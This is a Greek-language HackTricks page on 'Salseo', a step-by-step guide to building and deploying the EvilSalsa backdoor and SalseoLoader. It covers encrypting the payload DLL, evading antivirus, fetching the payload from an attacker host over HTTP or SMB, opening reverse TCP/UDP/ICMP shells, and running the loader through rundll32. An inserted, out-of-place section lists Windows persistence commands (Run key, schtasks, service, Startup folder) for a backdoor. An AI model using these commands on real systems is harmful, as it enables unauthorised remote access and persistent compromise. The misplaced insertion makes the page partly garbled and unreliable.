# Salseo

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Συγκέντρωση των δυαδικών αρχείων

Κατεβάστε τον πηγαίο κώδικα από το github και συγκεντρώστε τα **EvilSalsa** και **SalseoLoader**. Θα χρειαστεί να έχετε εγκατεστημένο το **Visual Studio** για να συγκεντρώσετε τον κώδικα.

Συγκεντρώστε αυτά τα έργα για την αρχιτεκτονική του παραθύρου όπου θα τα χρησιμοποιήσετε (Αν τα Windows υποστηρίζουν x64, συγκεντρώστε τα για αυτές τις αρχιτεκτονικές).

Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στο **"Platform Target".**

(\*\*Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στο **"Project Tab"** και στη συνέχεια στο **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Στη συνέχεια, συγκεντρώστε και τα δύο έργα (Build -> Build Solution) (Μέσα στα αρχεία καταγραφής θα εμφανιστεί η διαδρομή του εκτελέσιμου):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Προετοιμασία της πίσω πόρτας

Καταρχήν, θα χρειαστεί να κωδικοποιήσετε το **EvilSalsa.dll**. Για να το κάνετε αυτό, μπορείτε να χρησιμοποιήσετε το python script **encrypterassembly.py** ή μπορείτε να συγκεντρώσετε το έργο **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Το λειτουργικό σύστημα Windows παρέχει διάφορες δυνατότητες για τη δημιουργία backdoors και την εισβολή σε ένα σύστημα. Οι παρακάτω τεχνικές μπορούν να χρησιμοποιηθούν για να αποκτηθεί πρόσβαση σε έναν υπολογιστή με Windows:

#### 1. Εκτέλεση κακόβουλου κώδικα μέσω του Registry
Μπορείτε να δημιουργήσετε ένα backdoor εκτελώντας κακόβουλο κώδικα μέσω του Registry των Windows. Αυτό μπορεί να γίνει προσθέτοντας μια νέα τιμή στο κλειδί του Registry `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`. Όταν ο υπολογιστής επανεκκινηθεί, ο κακόβουλος κώδικας θα εκτελεστεί αυτόματα.

```plaintext
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```

#### 2. Εκτέλεση κακόβουλου κώδικα μέσω του Task Scheduler
Μπορείτε επίσης να δημιουργήσετε ένα backdoor εκτελώντας κακόβουλο κώδικα μέσω του Task Scheduler των Windows. Αυτό μπορεί να γίνει δημιουργώντας μια νέα εργασία στο Task Scheduler και ρυθμίζοντας την εκτέλεση του κακόβουλου κώδικα σε συγκεκριμένες συνθήκες.

```plaintext
schtasks /create /sc minute /mo 1 /tn Backdoor /tr "C:\path\to\backdoor.exe"
```

#### 3. Εκτέλεση κακόβουλου κώδικα μέσω του Windows Service
Μπορείτε επίσης να δημιουργήσετε ένα backdoor εκτελώντας κακόβουλο κώδικα μέσω ενός Windows Service. Αυτό μπορεί να γίνει δημιουργώντας ένα νέο Windows Service και ρυθμίζοντας την εκτέλεση του κακόβουλου κώδικα όταν το Service ξεκινά.

```plaintext
sc create Backdoor binPath= "C:\path\to\backdoor.exe" start= auto
sc start Backdoor
```

#### 4. Εκτέλεση κακόβουλου κώδικα μέσω του Windows Startup Folder
Μπορείτε επίσης να δημιουργήσετε ένα backdoor εκτελώντας κακόβουλο κώδικα μέσω του φακέλου Windows Startup. Αυτό μπορεί να γίνει προσθέτοντας ένα συντόμευση του κακόβουλου κώδικα στον φάκελο `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`. Όταν ο υπολογιστής επανεκκινηθεί, ο κακόβουλος κώδικας θα εκτελεστεί αυτόματα.

```plaintext
copy "C:\path\to\backdoor.exe" "C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

Αυτές είναι μερικές από τις τεχνικές που μπορείτε να χρησιμοποιήσετε για να δημιουργήσετε backdoors σε ένα σύστημα με Windows. Είναι σημαντικό να θυμάστε ότι η χρήση αυτών των τεχνικών για παράνομους σκοπούς είναι παράνομη και απαράδεκτη. Πάντα χρησιμοποιείτε αυτές τις τεχνικές με ηθικό τρόπο και μόνο για νόμιμους σκοπούς, όπως την ενίσχυση της ασφάλειας του συστήματος σας.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλο το Salseo: το **κωδικοποιημένο EvilDalsa.dll** και το **δυαδικό του SalseoLoader.**

**Μεταφορτώστε το δυαδικό SalseoLoader.exe στη μηχανή. Δεν θα πρέπει να ανιχνευθεί από κανένα AV...**

## **Εκτέλεση της πίσω πόρτας**

### **Λήψη εναντίον αντίστροφου κέλυφους TCP (λήψη κωδικοποιημένου dll μέσω HTTP)**

Θυμηθείτε να ξεκινήσετε ένα nc ως ακροατής αντίστροφου κελύφους και έναν HTTP διακομιστή για να εξυπηρετήσετε το κωδικοποιημένο evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Λήψη αντίστροφου κέλυφους UDP (λήψη κωδικοποιημένου dll μέσω SMB)**

Θυμηθείτε να ξεκινήσετε ένα nc ως ακροατής αντίστροφου κελύφους και έναν διακομιστή SMB για να εξυπηρετήσετε το κωδικοποιημένο evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Λήψη ενός αντίστροφου κελύφους ICMP (κωδικοποιημένο dll ήδη μέσα στο θύμα)**

**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε το αντίστροφο κέλυφος. Λήψη:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Απενεργοποίηση απαντήσεων ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Εκτέλεση του πελάτη:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Μέσα στο θύμα, ας εκτελέσουμε το πράγμα salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Μεταγλώττιση του SalseoLoader ως DLL που εξάγει την κύρια συνάρτηση

Ανοίξτε το έργο SalseoLoader χρησιμοποιώντας το Visual Studio.

### Προσθέστε πριν από την κύρια συνάρτηση: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Εγκαταστήστε το DllExport για αυτό το έργο

#### **Εργαλεία** --> **Διαχείριση πακέτων NuGet** --> **Διαχείριση πακέτων NuGet για τη λύση...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Αναζητήστε το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Αναζήτηση) και πατήστε Εγκατάσταση (και αποδεχθείτε το αναδυόμενο παράθυρο)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Στον φάκελο του έργου σας έχουν εμφανιστεί τα αρχεία: **DllExport.bat** και **DllExport\_Configure.bat**

### **Απεγκατάσταση** του DllExport

Πατήστε **Απεγκατάσταση** (ναι, είναι περίεργο αλλά εμπιστευτείτε με, είναι απαραίτητο)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Έξοδος από το Visual Studio και εκτέλεση του DllExport\_configure**

Απλά **βγείτε** από το Visual Studio

Στη συνέχεια, πηγαίνετε στον **φάκελο SalseoLoader** σας και **εκτελέστε το DllExport\_Configure.bat**

Επιλέξτε **x64** (αν πρόκειται να το χρησιμοποιήσετε μέσα σε ένα x64 box, αυτή ήταν η περίπτωσή μου), επιλέξτε **System.Runtime.InteropServices** (μέσα στο **Πεδίο ονομάτων για το DllExport**) και πατήστε **Εφαρμογή**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Ανοίξτε ξανά το έργο με το Visual Studio**

Το **\[DllExport]** δεν θα πρέπει πλέον να εμφανίζεται ως σφάλμα

![](<../.gitbook/assets/image (8) (1).png>)

### Κατασκευή της λύσης

Επιλέξτε **Τύπος εξόδου = Βιβλιοθήκη κλάσεων** (Έργο --> Ιδιότητες SalseoLoader --> Εφαρμογή --> Τύπος εξόδου = Βιβλιοθήκη κλάσεων)

![](<../.gitbook/assets/image (10) (1).png>)

Επιλέξτε **πλατφόρμα x64** (Έργο --> Ιδιότητες SalseoLoader --> Κατασκευή --> Προορισμός πλατφόρμας = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Για να **κατασκευάσετε** τη λύση: Κατασκευή --> Κατασκευή λύσης (Μέσα στην κονσόλα εξόδου θα εμφανιστεί η διαδρομή του νέου DLL)

### Δοκιμή του παραγόμενου Dll

Αντιγράψτε και επικολλήστε το Dll όπου θέλετε να το δοκιμάσετε.

Εκτελέστε:
```
rundll32.exe SalseoLoader.dll,main
```
Εάν δεν εμφανίζεται κανένα σφάλμα, πιθανώς να έχετε ένα λειτουργικό DLL!!

## Λήψη κέλυφους χρησιμοποιώντας το DLL

Μην ξεχάσετε να χρησιμοποιήσετε έναν **HTTP** **διακομιστή** και να ορίσετε έναν **nc** **ακροατή**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

Το CMD (Command Prompt) είναι ένα παράθυρο εντολών που εκτελείται στο λειτουργικό σύστημα Windows. Χρησιμοποιείται για την εκτέλεση εντολών και την αλληλεπίδραση με το σύστημα αρχείων, τους φακέλους και τις εφαρμογές του υπολογιστή. Μπορεί να χρησιμοποιηθεί και για την εκτέλεση εντολών που σχετίζονται με την ασφάλεια και την πεντεστική διαδικασία. Οι εντολές CMD μπορούν να χρησιμοποιηθούν για τη δημιουργία, την ανάγνωση, την επεξεργασία και τη διαγραφή αρχείων και φακέλων, καθώς και για την εκτέλεση προγραμμάτων και την πρόσβαση σε διάφορες ρυθμίσεις του συστήματος. Είναι ένα ισχυρό εργαλείο που μπορεί να χρησιμοποιηθεί για διάφορες εργασίες στον υπολογιστή.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
